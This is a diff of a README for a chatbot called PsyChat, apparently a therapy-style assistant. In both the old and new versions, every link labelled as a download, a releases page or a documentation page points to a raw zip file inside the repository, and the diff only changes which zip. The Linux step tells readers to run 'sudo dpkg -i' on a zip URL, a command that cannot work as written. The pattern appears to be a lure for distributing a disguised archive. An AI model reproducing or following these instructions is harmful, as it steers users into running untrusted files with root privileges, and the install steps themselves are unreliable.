@@ -15,10 +15,10 @@ To begin using PsyChat, follow these simple steps:
 ### 1. Download PsyChat
 Click the button below to access the latest release. 
 
-[![Download PsyChat](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip%20PsyChat-Get%20It%20Now-blue)](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip)
+[![Download PsyChat](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip%20PsyChat-Get%20It%20Now-blue)](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip)
 
 ### 2. Choose Your Version
-Visit the [Releases page](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip) to find the version suitable for your operating system. Look for the latest stable release.
+Visit the [Releases page](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip) to find the version suitable for your operating system. Look for the latest stable release.
 
 ### 3. Install PsyChat
 After downloading, locate the file in your downloads folder. Follow these install steps:
@@ -34,10 +34,10 @@ After downloading, locate the file in your downloads folder. Follow these instal
 - For **Linux**:
   1. Open your terminal.
   2. Navigate to the folder where you downloaded PsyChat.
-  3. Run the command: `sudo dpkg -i https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip`.
+  3. Run the command: `sudo dpkg -i https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip`.
 
 ## 🔄 Download & Install
-To download PsyChat, visit the [Releases page](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip) again. Make sure to select the correct file for your system. 
+To download PsyChat, visit the [Releases page](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip) again. Make sure to select the correct file for your system. 
 
 ## 🛠️ System Requirements
 ### For Windows:
@@ -64,8 +64,8 @@ Once installed, open PsyChat from your applications. You will find a simple, cle
   
 ## 📚 Additional Resources
 For more information on the inner workings of PsyChat and tips for effective usage, refer to these useful links:
-- [REBT Overview](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip)
-- [Emotional Management Techniques](https://raw.githubusercontent.com/rein98/PsyChat/main/resources/prompts/PsyChat_v1.7.zip)
+- [REBT Overview](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip)
+- [Emotional Management Techniques](https://raw.githubusercontent.com/rein98/PsyChat/main/src/agent/Psy_Chat_v1.1.zip)
   
 ## 💬 Frequently Asked Questions
 ### Q: Is PsyChat suitable for everyone?
